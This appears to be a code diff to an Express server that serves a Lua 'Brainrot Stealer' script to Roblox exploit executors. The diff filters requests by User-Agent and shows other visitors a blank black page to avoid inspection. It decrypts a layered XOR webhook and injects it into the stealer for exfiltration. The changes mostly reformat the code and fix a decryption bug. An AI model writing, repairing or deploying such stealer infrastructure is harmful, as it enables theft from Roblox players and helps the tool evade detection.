@@ -10,16 +10,20 @@ function blockNonExecutor(req, res, next) {
   const ua  = (req.get("User-Agent") || "").toLowerCase();
   const ref = (req.get("Referer")    || "").toLowerCase();
 
-  const allowed = ua.includes("roblox") ||
-                  ua.includes("synapse") ||
-                  ua.includes("krnl") ||
-                  ua.includes("fluxus") ||
-                  ua.includes("executor") ||
-                  ref.includes("roblox.com");
+  const allowed =
+    ua.includes("roblox") ||
+    ua.includes("synapse") ||
+    ua.includes("krnl") ||
+    ua.includes("fluxus") ||
+    ua.includes("executor") ||
+    ref.includes("roblox.com");
 
   if (!allowed) {
-    return res.status(403).send(`<!DOCTYPE html><html><head><title></title>
-<style>body{background:#000;margin:0;padding:0;overflow:hidden;}</style></head><body></body></html>`);
+    return res.status(403).send(`
+<!DOCTYPE html><html><head><title></title>
+<style>body{background:#000;margin:0;padding:0;overflow:hidden;}</style></head>
+<body></body></html>
+    `.trim());
   }
   next();
 }
@@ -28,12 +32,15 @@ function blockNonExecutor(req, res, next) {
 // HOME – BLACK SCREEN
 // ---------------------------------------------------------------
 app.get("/", (req, res) => {
-  res.send(`<!DOCTYPE html><html><head><title></title>
-<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head><body></body></html>`);
+  res.send(`
+<!DOCTYPE html><html><head><title></title>
+<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
+<body></body></html>
+  `.trim());
 });
 
 // ---------------------------------------------------------------
-// /raw – ONLY EXECUTORS + INJECT ENCRYPTED WEBHOOK
+// /raw – EXECUTORS ONLY + INJECT ENCRYPTED WEBHOOK
 // ---------------------------------------------------------------
 app.get("/raw", blockNonExecutor, (req, res) => {
   const encrypted = req.query.wh;
@@ -53,7 +60,7 @@ app.get("/raw", blockNonExecutor, (req, res) => {
     const key2 = "x7f9!pQz@3mK*vR$5";
     let layer2 = "";
     for (let i = 0; i < layer1.length; i++) {
-      const k = key2.char  CodeAt(i % key2.length);
+      const k = key2.charCodeAt(i % key2.length);   // <-- FIXED: was "char  CodeAt"
       const d = layer1.charCodeAt(i);
       layer2 += String.fromCharCode(d ^ k);
     }
@@ -67,7 +74,7 @@ app.get("/raw", blockNonExecutor, (req, res) => {
     return res.status(400).send("-- INVALID WEBHOOK --");
   }
 
-  // ---- FULL FIXED LUA SCRIPT (same as the one you just ran) ----
+  // ---- FULL FIXED LUA SCRIPT (same as the working one) ----
   const lua = `-- BRAINROT STEALER – FULLY FIXED
 local Players        = game:GetService("Players")
 local HttpService    = game:GetService("HttpService")
@@ -239,7 +246,7 @@ end
 GUI()
 print("Brainrot Stealer loaded!")`;
 
-  // inject the encrypted webhook
+  // inject encrypted webhook
   const finalLua = lua.replace("${encrypted}", encrypted);
   res.type("text/plain").send(finalLua);
 });
@@ -248,14 +255,17 @@ print("Brainrot Stealer loaded!")`;
 // 404 – BLACK SCREEN
 // ---------------------------------------------------------------
 app.use((req, res) => {
-  res.status(404).send(`<!DOCTYPE html><html><head><title></title>
-<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head><body></body></html>`);
+  res.status(404).send(`
+<!DOCTYPE html><html><head><title></title>
+<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
+<body></body></html>
+  `.trim());
 });
 
 // ---------------------------------------------------------------
-// START
+// START SERVER
 // ---------------------------------------------------------------
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
-  console.log(`Example link: https://YOURDOMAIN.com/raw?wh=<ENCRYPTED_WEBHOOK>`);
+  console.log(`Example: https://YOURDOMAIN.onrender.com/raw?wh=<ENCRYPTED_WEBHOOK>`);
 });
